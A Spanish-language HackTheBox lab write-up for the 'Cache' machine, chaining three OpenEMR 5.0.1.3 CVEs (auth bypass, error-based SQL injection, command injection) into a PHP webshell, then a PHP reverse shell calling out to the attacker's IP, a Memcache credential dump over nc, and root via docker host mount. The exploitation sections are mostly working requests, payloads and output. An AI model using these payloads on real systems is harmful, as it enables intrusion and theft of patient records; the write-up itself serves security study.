---
icon: linux
tags:
  - openerm
  - cve-2018-15152
  - cve-2018-15143
  - cve-2018-15154
  - authentication-bypass
  - sql-injection
  - sqli-error-based
  - os-command-injection
  - rce
  - docker
---

# Cache

## Resumen

### Detalles

| Campo                 | Detalle      |
| --------------------- | ------------ |
| **Nombre**            | Cache        |
| **Sistema Operativo** | Linux        |
| **Plataforma**        | HackTheBox   |
| **Fecha**             | 11/11/2026   |
| **IP Objetivo**       | 10.129.49.31 |

### Executive Summary

La máquina **Cache** permitió comprometer el sistema completo mediante una cadena de fallos encadenados. El punto de entrada fue una instalación de **OpenEMR 5.0.1.3** vulnerable, que permitió saltarse la autenticación, extraer credenciales de la base de datos mediante SQL Injection y ejecutar comandos en el servidor.

Con acceso inicial como `www-data`, se reutilizó una contraseña obtenida en la web para acceder al usuario `ash`. Después, un servicio **Memcache** expuesto localmente reveló credenciales del usuario `luffy`, quien pertenecía al grupo `docker`, lo que permitió montar el sistema de archivos del host y escalar a **root**.

**Impacto:** compromiso total del servidor, incluyendo acceso como root, debido a vulnerabilidades en OpenEMR, reutilización de credenciales y una configuración insegura de Docker.

### Técnicas

* Information Leakage
* Abuse OpenEMR (CVE-2018-15152 - CVE-2018-15143 - CVE-2018-15154)
* Authentication Bypass
* SQL Injection Error-based
* OS Command Injection (RCE)
* Abuse Docker Group

## Information Gathering

### Port Scanning

#### TCP

Port discovering

```bash
> sudo nmap -sS --min-rate 5000 -Pn -n -vv -p- 10.129.49.31
```

Detección de servicios y versiones de los puertos descubiertos

```bash
> nmap -sCV -Pn -n -v -p22,80 10.129.49.31
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Cache
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión                                                      |
| ------ | -------- | ------------------------------------------------------------ |
| 22/tcp | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | http     | Apache httpd 2.4.29 ((Ubuntu))                               |

### Enumeration

#### Web

*   El directorio /jquery permitía listar contenido

    ![](<../../../.gitbook/assets/Pasted image 2026-11-11 17.11.53.png>)
* jquery/functionality.js contenía credenciales hardcodeados

```js
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){ 
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){ // En author.html se reveló que "ASH" es el CEO
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();


        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});
```

Se probaron los credenciales frente al servicio SSH sin éxito

*   El CEO (ASH) también tenía un proyecto llamado HMS (Hospital Management System)

    ![](<../../../.gitbook/assets/Pasted image 2026-11-11 17.11.54.png>)
* Se añadió la siguiente linea a `/etc/hosts` para comprobar si se resolvia hms como subdominio o vhost

```
10.129.49.31 cache.htb hms.cache.htb hms
```

hms.cache.htb mostraba la misma pagina que cache.htb, se descartó el subdominio hms.htb mostraba un panel de inicio de sesión de OpenEMR (Se confirmó la presencia del vhost) ![](<../../../.gitbook/assets/Pasted image 2026-11-11 17.11.59.png>)&#x20;

Se probaron los credenciales obtenidos anteriormente sin exito.

Se empleó fuzzing de archivos en la raíz con resultados interesantes.

```bash
> ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u "http://hms.htb/FUZZ"

index.php
admin.php
setup.php
version.php
controller.php
build.xml
```

En `admin.php` se reveló la versión de OpenEMR (5.0.1.3)

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.00.png" alt=""><figcaption></figcaption></figure>

(También se intento añadir un nuevo sitio pero la función estaba deshabilitada)

## Explotación

### Foothold

Se logró la ejecución como punto final de una cadena de ataques que afectaba a OpenEMR en todas sus versiones anteriores a la 5.1.0.4.

**Reference**: https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf



La primera vulnerabilidad (**Authentication Bypass**) asociada a **CVE-2018-15152** permite saltarse la autenticación para acceder a secciones de la página sin autenticación previa. Se hace una petición a http://hms.htb/portal/account/register.php y se obtiene una cookie de sesión con la cual después podrás acceder a las siguientes rutas:

```markdown
- add_edit_event_user.php
- find_appt_popup_user.php
- get_allergies.php
- get_amendments.php
- get_lab_results.php
- get_medications.php
- get_patient_documents.php
- get_problems.php
- get_profile.php
- portal_payment.php
- messaging/messages.php
- messaging/secure_chat.php
- report/pat_ledger.php
- report/portal_custom_report.php
- report/portal_patient_report.php
```



La segunda vulnerabilidad (**SQL Injection Error-based**) asociada a **CVE-2018-15143** se presenta en el archivo `find_appt_popup_user.php` (al cual es posible acceder sin autenticación gracias a la anterior vulnerabilidad) tiene sus dos parametros vulnerables a SQLi&#x20;

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.01.png" alt=""><figcaption></figcaption></figure>



La tercera vulnerabilidad de la cadena (**OS Command Injection / Remote Code Execution**) asociada a **CVE-2018-15154** se explota una vez autenticados. La autenticación se logró debido a un credencial débil extraida de la base de datos mediante la anterior vulnerabilidad, el cual se logró desencriptar con el diccionario `rockyou`. Al estar autenticado, en http://hms.htb/interface/super/edit\_globals.php se encontró un comando como valor de una constante con acceso a poder modificarlo. Este comando se ejecutaba al realizar una petición post a http://hms.htb/interface/billing/sl\_eob\_search.php



* **Vulnerabilidades:** ==Authentication Bypass== (CVE-2018-15152) + ==SQL Injection Error-based== (CVE-2018-15143) > ==OS Command Injection / RCE== (CVE-2018-15154)



* **Procedimiento:**



1. (**Authentication Bypass**, petición a `/portal/account/register.php` Al acceder a http://hms.htb/portal/account/register.php se obtiene una cookie de sesión la cual posteriormente permite acceder a ciertos archivos sin autenticación.



2. (**SQL Injection Error-based**): Extracción de usuario y contraseña mediante SQLi.

* Petición de obtención del usuario

```http
GET /portal/find_appt_popup_user.php?providerid=&catid=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),+CONCAT((SELECT+username+FROM+users+LIMIT+1),+FLOOR(RAND(0)*2))+AS+x+FROM+information_schema.tables+GROUP+BY+x)+AS+a)--+- HTTP/1.1
Host: hms.htb
Accept-Language: en-US,en;q=0.
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: OpenEMR=od5sgm4f21r36mm95i09th7i2j; PHPSESSID=qmqektjmhlfc48our8rvpg29s2
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Date: Wed, 11 Nov 2026 07:02:54 GMT
Server: Apache/2.4.29 (Ubuntu
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 512
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8

<h2><font color='red'>Query Error</font></h2><p><font color='red'>ERROR:</font> query failed: SELECT pc_duration FROM openemr_postcalendar_categories WHERE pc_catid = '1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT username FROM users LIMIT 1), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS a)-- -'</p><p>Error: <font color='red'>Duplicate entry 'openemr_admin1' for key '&lt;group_key&gt;'</font></p><br>/var/www/hms.htb/public_html/portal/find_appt_popup_user.php at 106:sqlQuery
```

Se obtuvo el usuario: `openemr_admin`

* Petición de obtención de contraseña

```http
GET /portal/find_appt_popup_user.php?providerid=&catid=1'+AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT(IFNULL((SELECT+password+FROM+users+LIMIT+1),0x4e554c4c),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+- HTTP/1.1
Host: hms.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: OpenEMR=od5sgm4f21r36mm95i09th7i2j; PHPSESSID=qmqektjmhlfc48our8rvpg29s2
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Date: Wed, 11 Nov 2026 07:15:55 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 574
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8

<h2><font color='red'>Query Error</font></h2><p><font color='red'>ERROR:</font> query failed: SELECT pc_duration FROM openemr_postcalendar_categories WHERE pc_catid = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(IFNULL((SELECT password FROM users_secure LIMIT 1),0x4e554c4c),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -'</p><p>Error: <font color='red'>Duplicate entry '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.1' for key '&lt;group_key&gt;'</font></p><br>/var/www/hms.htb/public_html/portal/find_appt_popup_user.php at 106:sqlQuery
```

Se obtuvo la contraseña encriptada (BCrypt) `$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B`



3. **BCrypt Password Cracking** con hashcat

```bash
> hashcat -m 3200 -a 0 openemr_admin.txt /usr/share/wordlists/rockyou.txt

$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
```

Se revela la contraseña en texto plano: `xxxxxx` mediante lo que se pudo iniciar sesión.&#x20;

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.02.png" alt="" width="375"><figcaption></figcaption></figure>





4. (**OS Command Injection**) Se inyecta un comando que crea una webshell en PHP para desplegar una reverse shell Se accede a http://hms.htb/interface/super/edit\_globals.php. En el apartado "Miscellaneous" se reemplaza el valor de "**Print Command**" con el siguiente payload que crea un archivo rce2.php con una webshell

&#x20;

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.03.png" alt="" width="563"><figcaption></figcaption></figure>

**Payload**:

```bash
echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' > rce2.php
```

Para que se ejecute el comando es necesario realizar la siguiente petición:

```http
POST /interface/billing/sl_eob_search.php HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencode
Content-Length: 12
Cookie: PHPSESSID=qmqektjmhlfc48our8rvpg29s2; OpenEMR=uhak9i42usk0o6bjqnv102qaqk
Connection: close
Upgrade-Insecure-Requests: 1

form_print=1
```

La shell se crea en http://hms.htb/interface/billing/rce2.php

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.04.png" alt="" width="563"><figcaption></figcaption></figure>

Los comandos se ejecutan como el usuario `www-data`.

En local, se pone el puerto 9401 en escucha para obtener la reverse shell

```bash
> rlwrap -cAr netcat -lvnp 9401
```

Se ejecuta el siguiente comando en la webshell

```bash
> php -r '$sock=fsockopen("10.10.14.108",9401);shell_exec("bash <&3 >&3 2>&3");'
```





5. **Reutilización de credenciales** Conectarse por SSH al usuario **ash** no había sido posible con la contraseña obtenida anteriormente en cache.htb. No porque la credencial fuese incorrecta, si no porque la autenticación por SSH en ese usuario estaba deshabilitada. Desde la reverse shell se procede a la autenticación mediante sudo

```bash
> su ash
Password: H@v3_fun
```

* **Evidencia:** (`user.txt`)&#x20;

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.06.png" alt="" width="563"><figcaption></figcaption></figure>

### Privesc

Una vez se logra la autenticación como el usuario **ash**, se descubrieron 2 puertos que estaban en uso los cuales no eran accesibles externamente.

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.07.png" alt="" width="563"><figcaption></figcaption></figure>

El puerto 11211 es el puerto que utiliza Memcache.

<div align="left"><figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.10.png" alt="" width="550"><figcaption></figcaption></figure></div>



Se desarrolló una herramienta en bash que automatiza la enumeración de este servicio: https://github.com/frxn4f/memcache-enum&#x20;



<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.11.png" alt="" width="370"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.13.png" alt=""><figcaption></figcaption></figure>

&#x20;

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.13 (1).png" alt="" width="516"><figcaption></figcaption></figure>

Mediante la enumeración se identificó que estaba habilitado el dump.

Se dumpearon los credenciales que pertenecían al usuario `luffy` los cuales eran validos para el servicio SSH.

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.17.png" alt="" width="374"><figcaption></figcaption></figure>

```bash
> id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```

El usuario **luffy** pertenecía al grupo docker. Mediante docker se desplegó un contenedor que monta el sistema de archivos raíz `/` lo cual permitió escalar a root.

* **Vulnerabilidad:** ==Docker Group Abuse / Host File System Mount==
* **Procedimiento:**





1. **Se dumpearon los metadatos de Memcache**

```bash
> echo "lru_crawler metadump all" | nc -vn -w 1 127.0.0.1 11211

Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
key=account exp=-1 la=1794398100 cas=6151 fetch=no cls=1 size=75
key=file exp=-1 la=1794398100 cas=6152 fetch=no cls=1 size=70
key=passwd exp=-1 la=1794398101 cas=6153 fetch=yes cls=1 size=74
key=user exp=-1 la=1794398101 cas=6154 fetch=no cls=1 size=68
END
```





2. **Se obtuvo el valor de user y passwd**

```bash
> echo "get user" | nc -w 2 127.0.0.1 11211
VALUE user 0 5
luffy
END
> echo "get passwd" | nc -w 2 127.0.0.1 11211
VALUE passwd 0 9
0n3_p1ec3
END
```





3. **Se desplegó un contenedor que monta el sistema de archivos raíz**

```bash
> docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```

<figure><img src="../../../.gitbook/assets/Pasted image 2026-11-11 17.12.18.png" alt="" width="563"><figcaption></figcaption></figure>



* **Evidencia:** (root.txt)

![](<../../../.gitbook/assets/Pasted image 2026-11-11 17.12.19.png>)
